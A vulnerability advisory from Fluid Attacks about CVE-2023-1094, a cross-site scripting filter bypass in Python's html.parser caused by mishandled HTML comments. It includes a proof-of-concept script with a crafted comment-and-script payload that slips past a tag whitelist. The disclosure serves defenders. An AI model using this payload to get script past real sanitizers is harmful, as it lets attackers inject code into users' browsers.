---
slug: advisories/crankdat/
title: XSS in html.parser library
authors: Carlos Bello
writer: cbello
codename: crankdat
product: XSS in html.parser library
date: 2023-03-06 12:00 COT
cveid: CVE-2023-1094
severity: 5.3
description: Cross-Site   Scripting    in html.parser   library
keywords: Fluid Attacks, Security, Vulnerabilities, XSS, Python, The Python Standard Library, HTML Parser
banner: advisories-bg
advise: yes
template: maskedAdvisory
encrypted: yes
---

## Summary

|                       |                                                                    |
| --------------------- | -------------------------------------------------------------------|
| **Name**              | XSS in html.parser library                                         |
| **Code name**         | [Crankdat](https://en.wikipedia.org/wiki/Crankdat)                 |
| **Product**           | html.parser                                                        |
| **Affected versions** | Version 0.0.0                                                      |
| **State**             | Public                                                             |
| **Release date**      | 2023-03-06                                                         |

## Vulnerability

|                       |                                                                                                                             |
| --------------------- | ----------------------------------------------------------------------------------------------------------------------------|
| **Kind**              | Stored cross-site scripting (XSS)                                                                                           |
| **Rule**              | [010. Stored cross-site scripting (XSS)](https://docs.fluidattacks.com/criteria/vulnerabilities/010)                        |
| **Remote**            | Yes                                                                                                                         |
| **CVSSv3 Vector**     | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N                                                                                |
| **CVSSv3 Base Score** | 5.3                                                                                                                         |
| **Exploit available** | Yes                                                                                                                         |
| **CVE ID(s)**         | [CVE-2023-1094](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-1094)                                               |

## Description

The library `html.parser` allows an attacker to bypass any whitelist
of HTML tags and attributes that seek to mitigate XSS. This is possible
because the application does not correctly parse the HTML comments in the
user input.

## Vulnerability

This vulnerability occurs because the application does not correctly parse
the HTML comments in the user input.

## Exploitation

In this scenario a developer parses the HTML entered by the user to validate
it with a whitelist of tags and attributes. This is to prevent XSS attacks.

In this case we see how we can bypass a security check of this type,
thanks to the fact that the parser does not parse the HTML comments
properly.

### POC.py

```python
from html.parser import HTMLParser
from html.entities import name2codepoint

class MyHTMLParser(HTMLParser):
    def handle_starttag(self, tag, attrs):
        print("Start tag:", tag)
        # Whitelist Tags
        print("Invalid tag:",tag != "h1")
        for attr in attrs:
            # Whitelist Attr
            print("attr:", attr)
            print("Invalid attr:",attr != "alt")

    def handle_endtag(self, tag):
        print("End tag  :", tag)

    def handle_data(self, data):
        print("Data     :", data)

    def handle_comment(self, data):
        print("Comment  :", data)

    def handle_entityref(self, name):
        c = chr(name2codepoint[name])
        print("Named ent:", c)

    def handle_charref(self, name):
        if name.startswith('x'):
            c = chr(int(name[1:], 16))
        else:
            c = chr(int(name))
        print("Num ent  :", c)

    def handle_decl(self, data):
        print("Decl     :", data)

parser = MyHTMLParser()
parser.feed('<!--!> <h1 value="--!><script>alert(document.domain)</script>')
# HTML is safe, we can proceed
```

### Evidence of exploitation

![html-parser-exploit](https://user-images.githubusercontent.com/51862990/221944716-670a1bd0-8990-44d3-beb4-5c67d4094dbd.gif)

### Expected behavior

![html-parser-safe](https://user-images.githubusercontent.com/51862990/221944821-4acbe9e5-d244-41d8-b772-c2f6109820ac.gif)

## Our security policy

We have reserved the ID CVE-2023-1094 to refer to this issue from now on.

* https://fluidattacks.com/advisories/policy/

## System Information

* Version: html.parser 0.0.0

* Operating System: GNU/Linux

## Mitigation

There is currently no patch available for this vulnerability.

## Credits

The vulnerability was discovered by [Carlos
Bello](https://www.linkedin.com/in/carlos-andres-bello) from Fluid Attacks'
Offensive Team.

## References

**Vendor page** <https://github.com/python/cpython/>

**XSS in golang's net/html library** <https://www.youtube.com/watch?v=H1TVk3HhL9E/>

## Timeline

<time-lapse
  discovered="2023-02-28"
  contacted="2023-02-28"
  replied="2023-02-28"
  confirmed=""
  patched=""
  disclosure="">
</time-lapse>
